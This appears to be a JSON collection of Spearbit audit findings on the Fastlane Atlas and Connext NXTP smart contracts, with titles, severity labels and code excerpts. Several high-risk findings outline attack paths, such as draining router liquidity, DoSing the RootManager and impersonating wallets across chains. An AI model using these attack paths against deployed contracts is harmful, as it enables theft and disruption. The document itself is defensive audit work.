        "title": "VERIFICATION can be typed to AtlasVerification",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "VERIFICATION is always set to AtlasVerification contract. To remove any ambiguity, change its type to AtlasVerification instead of address.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rearranging terms will achieve higher precision",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The following computations can be rearranged to achieve higher precision for claims and gasRe- mainder: claims = rawClaims + ((rawClaims * SURCHARGE) / 10_000_000); gasRemainder += ((gasRemainder * SURCHARGE) / 10_000_000);",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Some ...get...Hash functions don't have ..._TYPE_HASH",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The functions _getProofHash() (2x) and _getSolverHash() include a ..._TYPE_HASH in the hashed data. While the similar functions getUserOperationHash() and getAltOperationHash(). Including ..._TYPE_HASH helps to make the data unique and prevent overlaps with other hashed data. Both _- getProofHash() for userOp and getUserOperationHash() do a signature over 12 fields. Luckily the types per field are different, otherwise there might a a collision between the two hashes. function _getProofHash(UserOperation memory userOp) internal pure returns (bytes32 proofHash) { proofHash = keccak256(abi.encode(USER_TYPE_HASH, /*...*/ )); } function _getProofHash(DAppOperation memory approval) internal pure returns (bytes32 proofHash) { proofHash = keccak256(abi.encode(DAPP_TYPE_HASH, /*...*/ )); } function _getSolverHash(SolverOperation calldata solverOp) internal pure returns (bytes32 solverHash) { return keccak256(abi.encode(SOLVER_TYPE_HASH, /*...*/ )); } function getUserOperationHash(UserOperation memory userOp) internal pure returns (bytes32 userOpHash) { userOpHash = keccak256(abi.encode(userOp)); // no ..._TYPE_HASH } function getAltOperationHash(UserOperation memory userOp) internal pure returns (bytes32 altOpHash) { altOpHash = keccak256(abi.encodePacked(userOp.from, /*...*/ )); // no ..._TYPE_HASH }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Functions _getProofHash() and getUserOperationHash() are very similar",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There are two ways to retrieve the hash of the userOp, via _getProofHash() and getUserOper- ationHash(). Function getUserOperationHash() also includes the userOp.signature, which isn't necessary because the hash of the rest of the data is already unique. The signature of a signature increases complexity. Having two very similar functions also increases code size and complexity. Note: also see the issue \"Some ...get...Hash functions don't have ..._TYPE_HASH\" for another difference. 125 function _getProofHash(UserOperation memory userOp) internal pure returns (bytes32 proofHash) { proofHash = keccak256( abi.encode( USER_TYPE_HASH, userOp.from, userOp.to, userOp.value, userOp.gas, userOp.maxFeePerGas, userOp.nonce, userOp.deadline, userOp.dapp, userOp.control, userOp.sessionKey, keccak256(userOp.data) ) // userOp.signature is not included ); } function getUserOperationHash(UserOperation memory userOp) internal pure returns (bytes32 userOpHash) { userOpHash = keccak256(abi.encode(userOp)); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "_get...Hash functions use different name patterns",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function _getProofHash() if overloaded for UserOperation, but for SolverOperation there is a different function name. It would be clearer to use the same pattern. function _getProofHash(DAppOperation /*...*/ ) /*...*/ {} function _getProofHash(UserOperation /*...*/ ) /*...*/ {} function _getSolverHash(SolverOperation /*...*/ ) /*...*/ {}",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "bitmap256 uses a different pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Most functions in AtlasVerification use uint256 bitmap. However function getNextNonce() uses uint256 bitmap256;. It would be more consistent to use the same pattern everywhere. function getNextNonce(address account, bool sequenced) external view returns (uint256) { // ... uint256 bitmap256; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Error DAppSignatureInvalid in _verifyDApp() is not specific",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function _verifyDApp() returns with error DAppSignatureInvalid if a SignatoryCheck fails. This error is not specific and difficult to trace back to the cause. function _verifyDApp(/*...*/ ) /*...*/ { // ... if (!bypassSignatoryCheck) { return (false, ValidCallsResult.DAppSignatureInvalid); // not specific } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Function _verifyDApp() accesses signatories[] directly",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The function _verifyDApp() accesses the array signatories[] directly. This array is part of the contract DAppIntegration. This exposes the implementation details. 127 function _verifyDApp( // ... if (!signatories[keccak256(abi.encodePacked(dAppOp.control, msgSender))]) { /*...*/ } // ... if (!signatories[keccak256(abi.encodePacked(dAppOp.control, dAppOp.from))]) { /*...*/ } // ... } function isDAppSignatory(address dAppControl, address signatory) external view returns (bool) { bytes32 signatoryKey = keccak256(abi.encodePacked(dAppControl, signatory)); return signatories[signatoryKey]; }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Contract AtlasVerification doesn't import ECDSA",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Contract AtlasVerification uses ECDSA from EIP712.sol. However the latest version of EIP712.sol doesn't import ECDSA anymore, so when an upgrade is done AtlasVerification doesn't compile anymore. Additionally it is also clearer to directly import ECDSA. There are the different versions:  EIP712 v5.0  EIP712 v4.9 import \"openzeppelin-contracts/contracts/utils/cryptography/EIP712.sol\"; contract AtlasVerification is EIP712, /*...*/ { using ECDSA for bytes32; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Comment of execute() is incorrect",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The comment of the last return value of execute() differs from the code. 128 function metacall(/*...*/ ) /*...*/ { // ... try this.execute{ /*...*/ }(/*...*/ ) returns (/*...*/ , uint256 winningSolverIndex) { // ... } // ... } /// @return uint256 The solver outcome bitmap ==> should be winningSolverIndex function execute(/*...*/ ) /*...*/ { // ... (/*...*/ , key) = _bidFindingIteration(/*...*/ ); // ... return (/*...*/ , uint256(key.solverOutcome)); } function _bidFindingIteration( // ... key.solverOutcome = uint24(bidPlaceholder); // is winningSolverIndex return (/*...*/ , key); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reuse of variables is confusing",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Sometimes variables are used for multiple purpuses, which is confusing when reading the code and also allows for errors in future code updates. This is most likely done to prevent \"stack too deep\" issues. The following examples have been found:  key.solverOutcome which is used as an error code and as the index for the winning solver.  endBalance which is used as the end token balance and as the remaining ETH balance. function _bidFindingIteration(/*...*/ ) /*...*/ { // ... (auctionWon, key) = _executeSolverOperation( /*...*/ ); // ... key.solverOutcome = uint24(bidPlaceholder); // ... } function _executeSolverOperation( // ... key.solverOutcome = uint24(result); // error code // ... return (false, key); } 129 function solverMetaTryCatch( // ... endBalance = etherIsBidToken ? endBalance : address(this).balance; if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "bidFind state is handled in a different way",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Within function _bidFindingIteration() a seperate state is maintained, the bidFind state. This could be integrated with other state mechanisms to simplify the code. function _bidFindingIteration(/*...*/ ) /*...*/ { // ... key.bidFind = true; // ... bidPlaceholder = _getBidAmount(dConfig, userOp, solverOps[i], returnData, key); // ... key.bidFind = false; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Inconsistent way to call CallBits",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "CallBits functions are usually called as CallBits.fn(self), but in the highlighted if condition, it's called as self.fn().",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused variables, constants and imports",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Highlighted variables, constants and imports (including test imports) aren't used.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Parenthesis can be used to remove ambiguity on the order of operations",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The code highlighted leaves some room for ambiguity on the order of operations for the code reader.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Prefer control naming over controller",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "control and controller is used to refer to the same actor in the system at different places.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Use abi.encodeCall instead of abi.encodeWithSelector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "abi.encodeCall does compile-time type check on function arguments. Hence, it should be preferred over abi.encodeWithSelector.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Outdated comment for _bidKnownIteration()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_bidKnownIteration() code doesn't match with this comment. // valid solverOps are packed from left of array - break at first invalid solverOp The loop doesn't break, and it iterates through the entire solverOps array.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Mix of require and revert statements",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There's a mix of require, revert with strings and revert with custom error statements in the code.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Escrow can inherit IEscrow",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "IEscrow is an interface declaring functions defined in Escrow contract. To make this concrete and to ensure that Escrow contract confirms to the interface, inheritance can be used.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Locking mechanism is complicated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "There are three different locking mechanisms used by Atlas:  _setAtlasLock() / _releaseAtlasLock(), which keeps track of the ExecutionEnvironment.  _trySolverLock() / _releaseSolverLock(), which keeps track of the current solver.  _buildEscrowLock() / key.lockState which keeps track of the current phase. The phase information is tracked in the ExecutionEnvironment, which is not reliable and is not accessible from Atlas. The ExecutionEnvironment also uses sub phases (e.g. BidFind is true or false). The functions for each phase are called from different locations. The role and phase limitation are not always enforced. Having different mechanisms is difficult to understand and maintain. See the following related issues:  validControl / onlyAtlasEnvironment are not effective in delegatecall situation  Code duplications for call to _allocateValue()  Passsing of key can be simplified  bidFind state is handled in a different way  Winning solver doesn't get gas costs _assign()ed  Function _releaseSolverLock() doesn't undo all the actions of _trySolverLock()  _releaseSolverLock() can be run without _trySolverLock()  callIndex incremented twice  userWrapper() does not always need forward() data  Checks for solverCalledBack don't cover all situations  reconcile() creates deposits out of thin air  Moving validateBalances() to Atlas  Borrow()s after validateBalances()  atlasSolverCall() doesn't check caller  factoryWithdrawERC20() and factoryWithdrawEther() not used 133",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "Return values of execute() can be simplified",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The only relevant information returned from execute() is the fact that the auction was won and who the winning solver was. This can be expressed in one variable, which would simplify the code. function metacall(/*...*/ ) returns (bool auctionWon) { // ... try this.execute{ /*...*/ }(/*...*/ ) returns (bool _auctionWon, uint256 winningSolverIndex) { auctionWon = _auctionWon; (/*...*/ ) = _settle({winningSolver: auctionWon ? solverOps[winningSolverIndex].from : ,! msg.sender, /*...*/ }); emit MetacallResult( /*...*/ , auctionWon ? solverOps[winningSolverIndex].from : address(0), /*...*/ ); } // ... ,! } Note: if auctionWon == false then winningSolverIndex still contains an error code set in _executeSolverOper- ation(), due to this issue: \"Reuse of variables is confusing\".",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "An else after a return or revert() isn't necesssary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "An else after a return or revert() isn't necessary. Removing them makes the code shorter and often easier to read. See for example: function metacall(/*...*/ ) /*...*/ { // ... if (/*...*/ ) { if (isSimulation) revert VerificationSimFail(uint256(validCallsResult)); else revert ValidCalls(validCallsResult); } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational Atlas.sol#L350-L364,"
        ]
    },
    {
        "title": "Errors ValidCalls and VerificationSimFail use different pattern",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The error ValidCalls(ValidCallsResult) uses a different parameter than VerificationSim- Fail(uint256 validCallsResult), while the supplied value is the same. This could use the same pattern. function metacall(/*...*/ ) /*...*/ { ,! (/*...*/ , ValidCallsResult validCallsResult) = IAtlasVerification(VERIFICATION).validateCalls(/*...*/ ); if (/*...*/ ) { if (/*...*/ ) revert VerificationSimFail(uint256(validCallsResult)); else revert ValidCalls(validCallsResult); } // ... } contract AtlasErrors { error VerificationSimFail(uint256 validCallsResult); error ValidCalls(ValidCallsResult); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Informational"
        ]
    },
    {
        "title": "swapInternal() shouldn't use msg.sender",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "As reported by the Connext team, the internal stable swap checks if msg.sender has sufficient funds on execute(). This msg.sender is the relayer which normally wouldn't have these funds so the swaps would fail. The local funds should come from the Connext diamond itself. BridgeFacet.sol function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { ... (uint256 amountOut, address asset, address local) = _handleExecuteLiquidity(...); ... } function _handleExecuteLiquidity(...) ... { ... (uint256 amount, address adopted) = AssetLogic.swapFromLocalAssetIfNeeded(...); ... } AssetLogic.sol function swapFromLocalAssetIfNeeded(...) ... { ... return _swapAsset(...); } function _swapAsset(... ) ... { ... SwapUtils.Swap storage ipool = s.swapStorages[_key]; if (ipool.exists()) { // Swap via the internal pool. return ... ipool.swapInternal(...) ... } } SwapUtils.sol function swapInternal(...) ... { IERC20 tokenFrom = self.pooledTokens[tokenIndexFrom]; require(dx <= tokenFrom.balanceOf(msg.sender), \"more than you own\"); ... } // msg.sender is the relayer",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "MERKLE.insert does not return the updated tree leaf count",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The NatSpec comment for insert is * @return uint256 Updated count (number of nodes in the tree). But that is not true. If the updated count is 2k (2n + 1) where k , n 2 N [ 0 then the return value would be 2n + 1. Currently, the returned value of insert is not being used, otherwise, this could be a bigger issue.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "PolygonSpokeConnector or PolygonHubConnector can get compromised and DoSed if an address(0) is passed to their constructor for _mirrorConnector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "PolygonSpokeConnector (PolygonHubConnector) inherits from SpokeConnector (HubConnector) and FxBaseChildTunnel (FxBaseRootTunnel). When PolygonSpokeConnector (PolygonHubConnector) gets de- ployed and its constructor is called, if _mirrorConnector == address(0) then setting the mirrorConnector stor- age variable is skipped: // File: Connector.sol#L118-L121 if (_mirrorConnector != address(0)) { _setMirrorConnector(_mirrorConnector); } Now since the setFxRootTunnel (setFxChildTunnel) is an unprotected endpoint that is not overridden by it and assign their own fxRootTunnel PolygonSpokeConnector (PolygonHubConnector) anyone can call (fxChildTunnel) address (note, fxRootTunnel (fxChildTunnel) is supposed to correspond to mirrorConnector on the destination domain). the require statement in setFxRootTunnel (setFxChildTunnel) only allows fxRootTunnel Note that (fxChildTunnel) to be set once (non-zero address value) so afterward even the owner cannot update this value. If at some later time the owner tries to call setMirrorConnector to assign the mirrorConnector, since _setMir- rorConnector is overridden by PolygonSpokeConnector (PolygonHubConnector) the following will try to execute: 9 // File: PolygonSpokeConnector.sol#L78-L82 function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxRootTunnel(_mirrorConnector); } Or for PolygonHubConnector: // File: PolygonHubConnector.sol#L51-L55 function _setMirrorConnector(address _mirrorConnector) internal override { super._setMirrorConnector(_mirrorConnector); setFxChildTunnel(_mirrorConnector); } But this will revert since fxRootTunnel (fxChildTunnel) is already set. Thus if the owner of PolygonSpokeConnec- tor (PolygonHubConnector) does not provide a non-zero address value for mirrorConnector upon deployment, a malicious actor can set fxRootTunnel which will cause: 1. Rerouting of messages from Polygon to Ethereum to an address decided by the malicious actor (or vice versa for PolygonHubConnector). 2. DoSing the setMirrorConnector and setFxRootTunnel (fxChildTunnel) endpoints for the owner. PolygonSpokeConnector's",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "A malicious owner or user with a Role.Router role can drain a router's liquidity",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "A malicious owner or user with Role.Router Role denominated as A in this example, can drain a router's liquidity for a current router (a router that has already been added to the system and might potentially have added big liquidities to some assets). Here is how A can do it (can also be done atomically): 1. Remove the router by calling removeRouter. 2. Add the router back by calling setupRouter and set the owner and recipient parameters to accounts A has access to / control over. 3. Loop over all tokens that the router has liquidity and call removeRouterLiquidityFor to drain/redirect the funds into accounts A has control over. That means all routers would need to put their trust in the owner (of this connext instance) and any user who has a Role.Router Role with their liquidity. So the setup is not trustless currently.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Users are forced to accept any slippage on the destination chain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The documentation mentioned that there is cancel function on the destination domain that allows users to send the funds back to the origin domain, accepting the loss incurred by slippage from the origin pool. However, this feature is not found in the current codebase. If the high slippage rate persists continuously on the destination domain, the users will be forced to accept the high slippage rate. Otherwise, their funds will be stuck in Connext.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Preservation of msg.sender in ZkSync could break certain trust assumption",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For ZkSync chain, the msg.sender is preserved for L1 -> L2 calls. One of the rules when pursuing a cross-chain strategy is to never assume that address control between L1 and L2 is always guaranteed. For EOAs (i.e., non-contract accounts), this is generally true that any account that can be accessed on Ethereum will also be accessible on other EVM-based chains. However, this is not always true for contract-based accounts as the same account/wallet address might be owned by different persons on different chains. This might happen if there is a poorly implemented smart contract wallet factory on multiple EVM-based chains that deterministically deploys a wallet based on some user-defined inputs. For instance, if a smart contract wallet factory deployed on both EVM-based chains uses deterministic CREATE2 which allows users to define its salt when deploying the wallet, Bob might use ABC as salt in Ethereum and Alice might use ABC as salt in Zksync. Both of them will end up getting the same wallet address on two different chains. A similar issue occurred in the Optimism-Wintermute Hack, but the actual incident is more complicated. Assume that 0xABC is a smart contract wallet owned and deployed by Alice on ZkSync chain. Alice performs a xcall from Ethereum to ZkSync with delegate set to 0xABC address. Thus, on the destination chain (ZkSync), only Alice's smart contract wallet 0xABC is authorized to call functions protected by the onlyDelegate modifier. 11 Bob (attacker) saw that the 0xABC address is not owned by anyone on Ethereum. Therefore, he proceeds to take ownership of the 0xABC by interacting with the wallet factory to deploy a smart contract wallet on the same address on Ethereum. Bob can do so by checking out the inputs that Alice used to create the wallet previously. Thus, Bob can technically make a request from L1 -> L2 to impersonate Alice's wallet (0xABC) and bypass the onlyDelegate modifier on ZkSync. Additionally, Bob could make a L1 -> L2 request by calling the ZKSync's BridgeFacet.xcall directly to steal Alice's approved funds. Since the xcall relies on msg.sender, it will assume that the caller is Alice. This issue is only specific to ZkSync chain due to the preservation of msg.sender for L1 -> L2 calls. For the other chains, the msg.sender is not preserved for L1 -> L2 calls and will always point to the L2's AMB forwarding the requests.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "No way to update a Stable Swap once assigned to a key",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Once a Stable Swap is assigned to a key (the hash of the canonical id and domain for token), it cannot be updated nor deleted. A Swap can be hacked or an improved version may be released which will warrant updating the Swap for a key.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Renouncing ownership or admin role could affect the normal operation of Connext",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Consider the following scenarios.  Instance 1 - Renouncing ownership All the contracts that extend from ProposedOwnable or ProposedOwnableUpgradeable inherit a method called renounceOwnership. The owner of the contract can use this method to give up their ownership, thereby leaving the contract without an owner. If that were to happen, it would not be possible to perform any owner-specific functionality on that contract anymore. The following is a summary of the affected contracts and their impact if the ownership has been renounced. 12 One of the most significant impacts is that Connext's message system cannot recover after a fraud has been resolved since there is no way to unpause and add the connector back to the system.  Instance 2 - Renouncing admin role All the contracts that extend from ProposedOwnableFacet inherit a method called revokeRole. 1. Assume that the Owner has renounced its power and the only Admin remaining used revokeRole to re- nounce its Admin role. 2. Now the contract is left with Zero Owner & Admin. 3. All swap operations collect adminFees via SwapUtils.sol contract. In absence of any Admin & Owner, these fees will get stuck in the contract with no way to retrieve them. Normally it would have been withdrawn using withdrawSwapAdminFees|SwapAdminFacet.sol. 4. This is simply one example, there are multiple other critical functionalities impacted once both Admin and Owner revoke their roles.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "No way of removing Fraudulent Roots",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "Fraudulent Roots cannot be removed once fraud is detected by the Watcher. This means that Fraud Roots will be propogated to each chain.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Large number of inbound roots can DOS the RootManager",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "It is possible to perform a DOS against the RootManager by exploiting the dequeueVerified function or insert function of the RootManager.sol. The following describes the possible attack path: 1. Assume that a malicious user calls the permissionless GnosisSpokeConnector.send function 1000 times (or any number of times that will cause an Out-of-Gas error later) within a single transaction/block on Gnosis causing a large number of Gnosis's outboundRoots to be forwarded to GnosisHubConnector on Ethereum. 2. Since the 1000 outboundRoots were sent at the same transaction/block earlier, all of them should arrive at the GnosisHubConnector within the same block/transaction on Ethereum. 13 3. For each of the 1000 outboundRoots received, the GnosisHubConnector.processMessage function will be triggered to process it, which will in turn call the RootManager.aggregate function to add the received out- boundRoot into the pendingInboundRoots queue. As a result, 1000 outboundRoots with the same commit- Block will be added to the pendingInboundRoots queue. 4. After the delay period, the RootManager.propagate function will be triggered. The function will call the dequeueVerified function to dequeue 1000 verified outboundRoots from the pendingInboundRoots queue by looping through the queue. This might result in an Out-of-Gas error and cause a revert. 5. If the above dequeueVerified function does not revert, the RootManager.propagate function will attempt to insert 1000 verified outboundRoots to the aggregated Merkle tree, which might also result in an Out-of-Gas error and cause a revert. If the RootManager.propagate function reverts when called, the latest aggregated Merkle root cannot be forwarded to the spokes. As a result, none of the messages can be proven and processed on the destination chains. Note: the processing on the Hub (which is on mainnet) can also become very expensive, as the mainnet usually as a far higher gas cost than the Spoke.",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Missing mirrorConnector check on Optimism hub connector",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "processMessageFromRoot() calls _processMessage() to process messages for the \"fast\" path. But _processMessage() can also be called by the AMB in the slow path. The second call to _processMessage() is not necessary (and could double process the message, which luckily is prevented via the processed[] mapping). The second call (from the AMB directly to _processMessage()) also doesn't properly verify the origin of the message, which might allow the insertion of fraudulent messages. 14 function processMessageFromRoot(...) ... { ... _processMessage(abi.encode(_data)); ... } function _processMessage(bytes memory _data) internal override { // sanity check root length require(_data.length == 32, \"!length\"); // get root from data bytes32 root = bytes32(_data); if (!processed[root]) { // set root to processed processed[root] = true; // update the root on the root manager IRootManager(ROOT_MANAGER).aggregate(MIRROR_DOMAIN, root); } // otherwise root was already sent to root manager }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Add _mirrorConnector to _sendMessage of BaseMultichain",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The function _sendMessage() of BaseMultichain sends the message to the address of the _amb. This doesn't seem right as the first parameter is the target contract to interact with according to multichain cross- chain. This should probably be the _mirrorConnector. function _sendMessage(address _amb, bytes memory _data) internal { Multichain(_amb).anyCall( _amb, // Same address on every chain, using AMB as it is immutable ... ); }",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Unauthorized access to change acceptanceDelay",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "The acceptanceDelay along with supportedInterfaces[] can be set by any user without the need of any Authorization once the init function of DiamondInit has been called and set. This is happening since caller checks (LibDiamond.enforceIsContractOwner();) are missing for these fields. Since acceptanceDelay defines the time post which certain action could be executed, setting a very large value could DOS the system (new owner cannot be set) and setting very low value could make changes without consid- eration time (Setting/Renounce Admin, Disable whitelisting etc at ProposedOwnableFacet.sol )",
        "labels": [
            "Spearbit",
            "ConnextNxtp",
            "Severity: High Risk"
        ]
    },
    {
        "title": "Messages destined for ZkSync cannot be processed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf",
        "body": "For ZkSync chain, L2 to L1 communication is free, but L1 to L2 communication requires a certain amount of ETH to be supplied to cover the base cost of the transaction (including the _l2Value) + layer 2 operator tip. The _sendMessage function of ZkSyncHubConnector.sol relies on the IZkSync(AMB).requestL2Transaction function to send messages from L1 to L2. However, the requestL2Transaction call will always fail because no ETH is supplied to the transaction (msg.value is zero). As a result, the ZkSync's hub connector on Ethereum cannot forward the latest aggregated Merkle root to the ZkSync's spoke connector on ZkSync chain. Thus, any message destined for ZkSync chain cannot be processed since incoming messages cannot be proven without the latest aggregated Merkle root. 16 function _sendMessage(bytes memory _data) internal override { // Should always be dispatching the aggregate root require(_data.length == 32, \"!length\"); // Get the calldata bytes memory _calldata = abi.encodeWithSelector(Connector.processMessage.selector, _data); // Dispatch message // [v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#structure](https://v2-docs.zksync.io/d ,! ev/developer-guides/Bridging/l1-l2.html#structure) // calling L2 smart contract from L1 Example contract // note: msg.value must be passed in and can be retrieved from the AMB view function ,! `l2TransactionBaseCost` c // [v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#using-contract-interface-in-your-proje ct](https://v2-docs.zksync.io/dev/developer-guides/Bridging/l1-l2.html#using-contract-interface-in- your-project) c c ,! ,! IZkSync(AMB).requestL2Transaction{value: msg.value}( // The address of the L2 contract to call mirrorConnector, // We pass no ETH with the call 0, // Encoding the calldata for the execute _calldata, // Ergs limit 10000, // factory dependencies new bytes[]0 ); } Additionally, the ZkSync's hub connector contract needs to be loaded with ETH so that it can forward the appro- priate amount of ETH when calling the ZkSync's requestL2Transaction. However, it is not possible to do so because no receive(), fallback or payable function has been 